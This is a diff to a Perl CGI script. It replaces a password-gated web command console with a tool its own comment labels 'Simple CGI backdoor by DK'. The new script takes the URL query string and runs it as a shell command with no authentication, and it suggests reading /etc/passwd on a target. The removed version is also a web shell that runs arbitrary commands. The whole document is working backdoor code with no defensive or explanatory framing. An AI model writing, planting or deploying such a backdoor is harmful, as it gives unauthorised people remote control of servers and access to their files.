@@ -1,71 +1,34 @@
-#!/usr/bin/perl
-use CGI;
-use Cwd;
-print CGI::header( -type => 'text/html' );
-my $command = CGI::param('command');
-my $pwd = CGI::param('pwd') || '';
-my $password = CGI::param('password');
-my $filename = CGI->script_name() ;
+#!/usr/bin/perl -w
 
-if ( $password ne 'yourpassword' ) {
-    print "Please provide a valid password.\n";
-    exit(0)
-}
+use strict;
 
-$pwd = $pwd eq '' ? `pwd` : $pwd;
-my $home = Cwd::cwd();
-chdir($pwd);
+print "Cache-Control: no-cache\n";
+print "Content-type: text/html\n\n";
 
-my $result='';
+my $req = $ENV{QUERY_STRING};
+	chomp ($req);
+	$req =~ s/%20/ /g; 
+	$req =~ s/%3b/;/g;
 
-if ($command =~ /^cd\s*(.*)/) {
-  my $dir = $1 or '';
-  if ($dir eq '') {
-    chdir($home);
-  } else {
-    chdir($dir);
-  }
-  $pwd = Cwd::cwd(); 
-  $result = `ls -la`;
-} else {
-  $result = `$command`;
-}
+print "<html><body>";
 
-print <<EOF;
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html><head>
-<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>console</title>
-<script>
-window.onload = function(){
-        document.getElementById("command").focus();
-        }
+print '<!-- Simple CGI backdoor by DK (http://michaeldaw.org) -->';
 
-</script>
-<style type="text/css">
-.wide1 {
-border-width: thick;
-width: 100%;
-height: 600px;
-}
-.wide2 {
-setFocus;
-border-width: thick;
-width: 100%;
-}
-</style>
-</head><body>
-<p>
-Script: $filename PWD: $pwd <br/>
-<textarea class="wide1" readonly="readonly" cols="1" rows="1" name="result">
-$result
-</textarea></p>
-<form method="get" action="$filename" name="command">Command:&nbsp;
-<input class="wide2" name="command" id="command"><br>
-<input name="password" value="$password" type="hidden">
-<input name="pwd" value="$pwd" type="hidden">
-</form>
-<br>
-</body></html>
-EOF
+	if (!$req) {
+		print "Usage: http://target.com/perlcmd.cgi?cat /etc/passwd";
+	}
+	else {
+		print "Executing: $req";
+	}
 
-exit 0;
+	print "<pre>";
+	my @cmd = `$req`;
+	print "</pre>";
+
+	foreach my $line (@cmd) {
+		print $line . "<br/>";
+	}
+
+print "</body></html>";
+
+# <!--    http://michaeldaw.org   2006    -->
